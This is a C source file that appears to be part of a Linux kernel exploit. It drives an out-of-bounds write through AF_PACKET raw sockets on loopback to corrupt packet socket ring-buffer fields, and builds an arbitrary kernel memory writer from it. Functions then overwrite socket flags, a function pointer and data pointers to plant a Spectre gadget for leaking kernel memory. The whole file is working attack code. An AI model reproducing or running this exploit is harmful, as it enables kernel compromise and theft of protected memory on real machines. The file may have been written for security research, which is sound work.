#include "memwrite.h"
#include "memprep.h"

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/if.h>

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

int loopback_send_socket = -1;
void loopback_send(char *buffer, int size) {
  if (loopback_send_socket == -1) {
    loopback_send_socket = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    if (loopback_send_socket == -1) {
      perror("[-] socket(SOCK_RAW)");
      exit(EXIT_FAILURE);
    }
  }

	packet_socket_send(loopback_send_socket, buffer, size);
}

void oob_write(char *buffer, int size) {
	loopback_send(buffer, size);
}

struct block_desc {
  uint32_t version;
  uint32_t offset_to_priv;
  struct tpacket_hdr_v1 h1;
};

// By setting the block_status to TP_STATUS_KERNEL,
// we re-enable the corresponding socket to receive packets.
void print_status_blocks(struct iovec *rd) {
  struct block_desc *pbd;

  pbd = (struct block_desc *) rd[0].iov_base;
  pbd->h1.block_status = TP_STATUS_KERNEL;

  pbd = (struct block_desc *) rd[1].iov_base;
  pbd->h1.block_status = TP_STATUS_KERNEL;
}

// Sets the writing position of the arb_mem_writer socket.
// The position is defined by the rx_ring.blk_sizeof_priv member of the packet socket.
// The position is an offset from the arb_mem_writer's rx_ring buffer.
// Updating the position with an oob write corrpts the rx_ring.pg_vec member.
// Closing the socket with a corrupted pg_vec will cuase an error in the kernel
// visible in dmesg.
int cur_pos = -0x99999;
void set_arb_mem_writer_pos(int pos) {
  if (pos < -0x1000 || pos > 32 * 1024) {
    printf("[-] Given pos is unsupported: %d (max pos beyond buffer=32kb), exiting..\n", pos);
    exit(0);
  }

  if (cur_pos == pos) return;
  cur_pos = pos;

  print_status_blocks(offset_writer->iov); // clear kernel buffers of offset_writer socket

  unsigned short blk_sizeof_priv = (unsigned short) calc_sizeof_priv(pos);

  char buffer[16];
  memset(buffer, 0, sizeof(buffer));
  buffer[4] = 0x44;
  *(unsigned short*) &buffer[12] = blk_sizeof_priv;

  oob_write(buffer+2, sizeof(buffer)-2);
}

void write_skc_flags(unsigned long skc_flags) {
  print_status_blocks(arb_mem_writer->iov); // clear kernel buffers of arb_mem_writer socket

  char buffer[48];
  memset(buffer, 0, sizeof(buffer));

  *(unsigned long*) &buffer[40] = skc_flags;

  oob_write(buffer+2, sizeof(buffer)-2);
}

void set_curr_specex_socket(int sock);
int get_specex_socket_offset(int specex_socket) {
  if (specex_socket == specex_socket_first) {
    return 0x0;
  } else {
    return 0x800;
  }
}

void write_fptr(int specex_socket, unsigned long val, int num_bytes) {
  set_curr_specex_socket(specex_socket);
  set_arb_mem_writer_pos(get_specex_socket_offset(specex_socket) + SK_WRITE_SPACE_OFFSET - 16);

  print_status_blocks(arb_mem_writer->iov); // clear kernel buffers of arb_mem_writer socket

  char buffer[24];
  memset(buffer, 0, sizeof(buffer));

  int valid_bytes = 16;
  while (num_bytes > 0) {
    buffer[valid_bytes] = (char) (val & 0xff);
    valid_bytes += 1;
    val >>= 8;
    num_bytes -= 1;
  }

  oob_write(buffer+2, valid_bytes-2);
}

void write_data_pointers(int specex_socket, unsigned long p1, unsigned long p2) {
  set_curr_specex_socket(specex_socket);
  set_arb_mem_writer_pos(get_specex_socket_offset(specex_socket) + FIRST_DEREF_IN_GADGET_SK_OFFSET - 0x30);

  print_status_blocks(arb_mem_writer->iov); // clear kernel buffers of arb_mem_writer socket

  char buffer[0x40];
  memset(buffer, 0, sizeof(buffer));

  buffer[0x2] = 0x03;
  buffer[0x22] = 0x03;
  *(unsigned long*) &buffer[0x28] = 0xffffffff024000c0;
  *(unsigned long*) &buffer[0x30] = p1;
  *(unsigned long*) &buffer[0x38] = p2;

  oob_write(buffer+2, sizeof(buffer)-2);
}

void write_spectre_data(int specex_socket, unsigned long spectre_gadget_addr, unsigned long array_base_addr, unsigned long data_ptr) {
  set_curr_specex_socket(specex_socket);
  set_arb_mem_writer_pos(get_specex_socket_offset(specex_socket) + SK_WRITE_SPACE_OFFSET - 16);

  print_status_blocks(arb_mem_writer->iov); // clear kernel buffers of arb_mem_writer socket

  char buffer[0x130];
  memset(buffer, 0, sizeof(buffer));

  *(unsigned long*) &buffer[0x010] = spectre_gadget_addr; // obj_base+0x298
  *(unsigned long*) &buffer[0x070] = data_ptr-0x28;       // obj_base+0x2f8
  *(unsigned long*) &buffer[0x0f8] = array_base_addr;     // obj_base+0x380
  *(unsigned long*) &buffer[0x128] = 1;                   // obj_base+0x3b0

  oob_write(buffer+2, sizeof(buffer)-2);
}
